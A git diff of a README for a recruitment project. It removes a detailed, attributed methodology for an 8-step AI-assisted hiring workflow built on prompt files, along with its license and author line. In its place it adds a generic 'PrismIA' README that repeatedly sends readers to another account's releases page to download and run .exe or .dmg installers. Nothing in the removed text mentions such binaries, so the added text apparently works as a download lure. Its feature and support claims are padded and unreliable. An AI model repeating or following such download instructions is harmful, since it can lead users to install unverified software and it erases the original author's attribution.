@@ -1,116 +1,74 @@
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL%20v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0.html)
+# 🎉 PrismIA - Bias-Free Hiring Made Simple
 
-**Also available in**: [English](README.md) | [Français](README.fr.md)
+## 🚀 Getting Started
+Welcome to PrismIA, an open-source framework designed to help you evaluate candidates without bias. With features like a 100-point scoring system and dual bias checkpoints, PrismIA simplifies the hiring process. 
 
-Version: 2.0 | Date: October 12, 2025 | Author: Gabriel Jossic
+## 📥 Download PrismIA
+[![Download PrismIA](https://img.shields.io/badge/Download_PrismIA-v1.0-blue.svg)](https://github.com/mtsalhudarowokele/PrismIA/releases)
 
-## **Overview & Core Principles**
+## 🔍 Features
+- **100-Point Scoring System**: Evaluate candidates based on a clear and fair scoring model.
+- **Dual Bias Checkpoints**: Ensure your hiring decisions are free from bias.
+- **Asynchronous Workflow**: Complete evaluations in a smooth step-by-step process.
+- **Model-Agnostic Design**: Works with various models like Claude, GPT, and GLM.
+- **Evidence-Based Hiring**: Make informed decisions with data-driven insights.
 
-This methodology treats recruitment as an analytical discipline rather than a subjective process. The objective is to supplement human decision-making with systematic data analysis, reducing bias while improving selection accuracy.
+## 💾 Download & Install
+To get started, visit the [Releases page](https://github.com/mtsalhudarowokele/PrismIA/releases) to download the latest version of PrismIA. Choose the version that matches your operating system. 
 
-The approach is built on **division of labor between AI and human evaluators**:
-*   **AI systems** process large datasets, execute repetitive tasks, and flag potential biases in decision patterns.
-*   **Human evaluators** handle contextual judgment, candidate engagement, strategic decisions, and final selections.
+### Installation Steps
+1. **Visit the Releases Page**: Follow this link: [Releases page](https://github.com/mtsalhudarowokele/PrismIA/releases).
+2. **Select Your Version**: Find the most recent version and click on it.
+3. **Choose the File**: Download the appropriate file for your operating system (Windows, MacOS, or Linux).
+4. **Install the Application**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
+   - **MacOS**: Open the downloaded `.dmg` file, drag PrismIA into your Applications folder.
+   - **Linux**: Use your package manager or follow specific instructions in the release notes if available.
+5. **Run PrismIA**: Open the application from your applications menu or desktop shortcut.
 
-The workflow targets three measurable outcomes:
-1.  **Reduced Bias:** Minimize subjective decision-making at critical evaluation points.
-2.  **Operational Efficiency:** Automate low-value tasks to allocate time to strategic activities.
-3.  **Candidate Experience:** Create a transparent, responsive process with clear evaluation criteria.
+## 📋 System Requirements
+- **Operating System**: Windows 10 or later, MacOS Mojave (10.14) or later, or any recent Linux distribution.
+- **Memory**: 4 GB RAM minimum.
+- **Storage**: At least 200 MB of free disk space.
+- **Internet Connection**: Required for initial setup and to download updates.
 
----
+## 🔧 How It Works
+PrismIA utilizes advanced language models to assist with candidate evaluations. You will follow an 8-step workflow designed to guide you through the evaluation process. Each step helps mitigate bias and provides a fair chance for all candidates.
 
-## **8-Step Workflow Implementation**
+1. **Step 1**: Create a new evaluation.
+2. **Step 2**: Add candidate information.
+3. **Step 3**: Use the scoring system to evaluate candidates.
+4. **Step 4**: Review bias checkpoints.
+5. **Step 5**: Get recommendations based on data insights.
+6. **Step 6**: Save evaluations for later review.
+7. **Step 7**: Share insights with your hiring team.
+8. **Step 8**: Make informed hiring decisions based on comprehensive data.
 
-### **Step 1: Semantic CV Analysis (AI)**
+## 💡 Support
+If you encounter issues while using PrismIA, please refer to the following resources:
 
-*   **Function:** Process high-volume applications using contextual analysis rather than keyword matching.
-*   **Primary System:** `Elite AI CV Semantic Analysis & Candidate Scoring Agent` (`CVAnalysis.md`).
-*   **Execution:**
-    1.  **Contextual Parsing:** The system extracts implicit skills from project descriptions. For example, "built recommendation engine for 10M users" indicates experience with ML pipelines, distributed systems, and production deployment—regardless of whether these terms appear explicitly.
-    2.  **Quantitative Scoring (0-100 scale):** Candidates receive scores across five dimensions: Technical Skills, Experience Quality/Impact, Behavioral Indicators, Learning Capacity, and Cultural Alignment Probability.
-    3.  **Ranked Output:** The system generates a prioritized candidate list, flagging non-traditional profiles that meet criteria but lack conventional markers.
+- **Troubleshooting**: Check the FAQs section on the Releases page for common issues.
+- **Community Support**: Join our community forum to ask questions and share experiences.
+- **GitHub Issues**: Report bugs or request features on the Issues section of our GitHub repository.
 
-### **Step 2: Automated Initial Contact (AI)**
+## 🌐 Topics
+PrismIA is relevant for a range of applications in the hiring process. Here are some related topics:
+- ai-agents
+- ai-interview
+- ai-recruiter
+- ai-recruitment
+- hiring automation
+- bias mitigation
+- candidate evaluation
+- resume screening
 
-*   **Function:** Engage top-tier candidates (typically top 20-30%) with personalized outreach to maximize response rates.
-*   **Primary System:** `Elite AI Recruitment Specialist - MODE 1: OUTREACH` (`Outreach+PreQualifScreening.md`).
-*   **Execution:**
-    1.  **Profile-Specific Messaging:** System references concrete elements from the candidate's background (specific projects, publications, measurable achievements).
-    2.  **Value-First Communication:** Messages focus on opportunity relevance rather than transactional recruitment language.
+By using PrismIA, you enhance your hiring process, ensuring a fair and transparent evaluation of candidates. 
 
-### **Step 3: Automated Pre-qualification (AI)**
+## 📢 Contribution
+We welcome contributions to PrismIA! If you are interested in helping improve the application, please check our contribution guidelines in the repository for more information on how to get started.
 
-*   **Function:** Validate mandatory requirements (technical prerequisites, compensation expectations, availability) without human involvement.
-*   **Primary System:** `Elite AI Recruitment Specialist - MODE 2: PRE-QUALIFICATION` (`Outreach+PreQualifScreening.md`).
-*   **Execution:** Conversational interface collects knockout criteria data, filtering candidates who don't meet non-negotiable constraints.
+## 📚 Additional Resources
+- **Documentation**: Extensive user guides and documentation can be found on our GitHub Wiki.
+- **Blog**: Follow our blog for updates on new features, best practices, and case studies in bias-free hiring.
 
-### **Step 4: Selection Review Process (Human ↔ AI)**
-
-*   **Function:** **Primary bias checkpoint.** Ensure candidate advancement decisions are evidence-based.
-*   **Primary System:** `Elite AI Objective Recruitment Debate Partner` (`InterviewDebate.md`).
-*   **Execution:**
-    1.  **Data Review:** System presents scoring data and analysis for each pre-qualified candidate.
-    2.  **Challenge Protocol:** Recruiter states decision (Advance/Reject). System challenges decisions that contradict data or appear based on subjective factors.
-        *   *Example:* If recruiter rejects a candidate scoring 89/100 citing "gut instinct," system responds: *"This decision contradicts the data. 'Gut instinct' often indicates unconscious bias. What objective criteria support rejecting the 3rd-ranked candidate?"*
-    3.  **Evidence-Based Resolution:** Protocol requires explicit, fact-based justification for decisions, particularly when contradicting quantitative analysis.
-
-### **Step 5: Structured Asynchronous Evaluation (AI + Human)**
-
-*   **Function:** Measure actual capabilities through structured assessment, eliminating communication-style bias inherent in synchronous interviews.
-*   **Primary System:** `Elite AI In-Depth Assessment Expert` (`Assessment.md`).
-*   **Execution:**
-    1.  **Assessment Delivery:** Candidates receive asynchronous written assessment (45-60 minute completion time) with explicit instructions and evaluation criteria.
-    2.  **Assessment Architecture (30% behavioral / 70% technical):**
-        *   **Behavioral Component (6 questions):** Evaluates handling of complexity, diagnostic approach, learning behavior, communication clarity, failure response, and collaboration patterns. Questions adapt to industry-specific terminology.
-        *   **Technical Component (5 questions):** Tests conceptual understanding, tradeoff analysis, tooling knowledge, quality practices, and applied problem-solving.
-    3.  **Automated Analysis:** System evaluates response depth, structure, and specificity. Generates scored report (0-100) with flagged concerns (plagiarism indicators, insufficient detail) and positive signals (quantified results, explicit learning from failures).
-
-### **Step 6: Interview Coordination and Execution (AI + Human)**
-
-*   **Function:** Handle scheduling logistics and enable high-value interview conversations.
-*   **Supporting Systems:** `Elite AI Recruitment Specialist - MODE 3: SCHEDULING` and `Elite AI Automated Candidate Communication Expert`.
-*   **Execution:**
-    1.  **Automated Scheduling:** System manages calendar coordination, timezone conversion, and multi-interviewer availability.
-    2.  **Interview Preparation:** Interviewers receive comprehensive reports from prior stages, enabling deeper technical discussions rather than redundant screening questions.
-
-### **Step 7: Interview Data Collection and Analysis (AI)**
-
-*   **Function:** Capture structured interview feedback immediately post-interview to accelerate decision cycles.
-*   **Primary System:** `Elite AI Automated Interview Feedback Collection & Analysis Agent` (`InterviewFeedback.md`).
-*   **Execution:**
-    1.  **Automated Collection:** System sends structured feedback forms to interviewers immediately after sessions.
-    2.  **Consolidated Analysis:** System synthesizes human feedback with any recorded interview analysis into unified report, highlighting consensus and divergence across evaluators.
-
-### **Step 8: Final Selection Review (Human ↔ AI)**
-
-*   **Function:** Ensure final decisions are auditable, justified, and consistent with collected evidence.
-*   **Primary System:** `Elite AI Objective Recruitment Debate Partner` (`InterviewDebate.md`).
-*   **Execution:**
-    1.  **Comprehensive Review:** System presents consolidated data for each finalist candidate.
-    2.  **Decision Protocol:** Team discusses candidates. System challenges subjective reasoning ("I prefer candidate X's vibe") with data: *"'Vibe' is not an objective criterion. Candidate Y scored 15 points higher on technical assessment and received unanimous positive feedback. What measurable factors support selecting candidate X?"*
-    3.  **Final Verification:** Last checkpoint against late-stage bias, ensuring decisions align with evidence and stated evaluation criteria.
-
----
-
-### **Workflow Component Summary**
-
-| Step | Function | Primary System | Purpose |
-| :--- | :--- | :--- | :--- |
-| **1** | Semantic Analysis | `CVAnalysis.md` | Evidence-based filtering on capability indicators |
-| **2** | Initial Contact | `Outreach+PreQualifScreening.md` | High-response engagement of qualified candidates |
-| **3** | Pre-qualification | `Outreach+PreQualifScreening.md` | Automated validation of mandatory criteria |
-| **4** | **Selection Review** | **`InterviewDebate.md`** | **Primary bias checkpoint before interviews** |
-| **5** | **Asynchronous Assessment** | **`Assessment.md`** | **Objective capability measurement** |
-| **6** | Interview Coordination | `Outreach+PreQualifScreening.md` | Logistics automation and preparation |
-| **7** | Feedback Analysis | `InterviewFeedback.md` | Structured post-interview data collection |
-| **8** | **Final Selection** | **`InterviewDebate.md`** | **Evidence-based final decision verification** |
-
----
-
-### **System Architecture: Framework vs. Component**
-
-This methodology integrates two distinct but complementary elements:
-
-*   The **8-Step Workflow** functions as the **process framework**—the control structure managing the complete recruitment pipeline from sourcing through final selection. It enforces consistency and bias checkpoints at each transition point.
-
-Together, these components form a complete system that is both **strategically coherent** (managing the full process) and **tactically rigorous** (executing accurate capability assessment), optimizing for both efficiency and selection quality.
+For further inquiries or additional assistance, please reach out through our contact page on GitHub. Thank you for using PrismIA, and happy hiring!
